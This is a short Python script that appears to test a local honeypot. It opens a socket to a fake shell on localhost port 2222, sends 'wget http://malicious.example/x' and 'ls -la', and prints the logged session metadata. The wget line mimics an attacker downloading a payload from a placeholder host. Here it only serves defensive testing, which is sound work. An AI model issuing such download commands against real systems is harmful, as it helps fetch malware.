import socket, time, pathlib, json

def recv_until_prompt(s, timeout=10.0):
    s.settimeout(1.0)
    end = time.time() + timeout
    buf = b""
    while time.time() < end:
        try:
            chunk = s.recv(4096)
            if not chunk:
                return buf.decode(errors='ignore')
            buf += chunk
            if b'root@fakehost:~#' in buf or b'Attempted download' in buf:
                return buf.decode(errors='ignore')
        except Exception:
            # keep waiting
            time.sleep(0.1)
            continue
    return buf.decode(errors='ignore')

def main():
    s = socket.socket()
    s.settimeout(20)
    s.connect(('127.0.0.1',2222))
    print("BANNER:", s.recv(4096).decode(errors='ignore'))
    # send wget
    s.send(b'wget http://malicious.example/x\n')
    # wait until server responds with either prompt or the attempted-download message
    out = recv_until_prompt(s, timeout=8.0)
    print("AFTER_WGET:", out)
    # now send ls
    s.send(b'ls -la\n')
    out2 = recv_until_prompt(s, timeout=4.0)
    print("LS_REPLY:", out2)
    s.close()

    # print latest meta.json
    sessions = sorted(pathlib.Path('data/sessions').iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
    if not sessions:
        print("NO_SESSION_FOUND")
        return
    d = sessions[0]
    p = d / 'meta.json'
    print("\\nUSING_SESSION_DIR:", d)
    print(json.dumps(json.load(open(p,'r',encoding='utf-8')), indent=2))

if __name__ == '__main__':
    main()
